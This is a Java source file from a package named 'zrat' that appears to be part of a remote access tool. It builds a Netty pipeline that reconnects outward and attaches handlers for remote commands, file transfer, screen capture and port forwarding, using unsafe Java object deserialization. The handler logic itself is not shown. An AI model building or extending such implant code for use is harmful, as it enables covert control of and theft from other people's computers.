package com.zrat.server.nio.factory;

import static org.jboss.netty.channel.Channels.pipeline;

import org.jboss.netty.bootstrap.ClientBootstrap;
import org.jboss.netty.channel.ChannelPipeline;
import org.jboss.netty.channel.ChannelPipelineFactory;
import org.jboss.netty.handler.codec.serialization.ObjectDecoder;
import org.jboss.netty.handler.codec.serialization.ObjectEncoder;
import org.jboss.netty.util.Timer;

import com.zrat.server.nio.handler.CommandHandler;
import com.zrat.server.nio.handler.FileHandler;
import com.zrat.server.nio.handler.PortForwardingHandler;
import com.zrat.server.nio.handler.ScreenHandler;

public class ServerPipelineFactory implements ChannelPipelineFactory {

	private Timer timer;
	private ClientBootstrap bootstrap;
	
    public static final int RECONNECT_DELAY = 5;
    
	public ServerPipelineFactory(ClientBootstrap bootstrap,Timer timer){
		super();
		this.timer = timer;
		this.bootstrap = bootstrap;
	}
	
	public ChannelPipeline getPipeline() throws Exception {
		ChannelPipeline pipeline = pipeline();
		
		pipeline.addLast("decoder", new ObjectDecoder());
		pipeline.addLast("encoder", new ObjectEncoder());
//		pipeline.addLast("deflater", new ZlibEncoder(ZlibWrapper.ZLIB));
//		pipeline.addLast("inflater", new ZlibDecoder(ZlibWrapper.ZLIB));
		pipeline.addLast("fileHandler", new FileHandler(bootstrap,timer));
		pipeline.addLast("commandHandler", new CommandHandler(bootstrap,timer));
		pipeline.addLast("screenHandler", new ScreenHandler(bootstrap,timer));
		pipeline.addLast("portForwardingHandler", new PortForwardingHandler(bootstrap,timer));
		
		return pipeline;
	}
}